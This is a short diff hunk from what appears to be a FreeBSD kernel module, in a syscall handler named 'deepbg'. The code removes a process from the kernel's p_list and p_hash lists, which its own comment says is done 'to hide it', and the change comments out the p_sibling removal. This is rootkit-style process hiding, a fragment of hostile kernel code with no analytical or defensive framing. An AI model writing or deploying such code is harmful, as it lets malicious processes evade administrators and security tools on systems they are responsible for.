@@ -84,7 +84,7 @@ static int deepbg(struct thread *td, void *syscall_args)
 
             /* Remove the process from p_list, p_sibling, and p_hash lists to hide it */
             LIST_REMOVE(p, p_list);
-            LIST_REMOVE(p, p_sibling);
+//            LIST_REMOVE(p, p_sibling);
             LIST_REMOVE(p, p_hash);
 
             /*
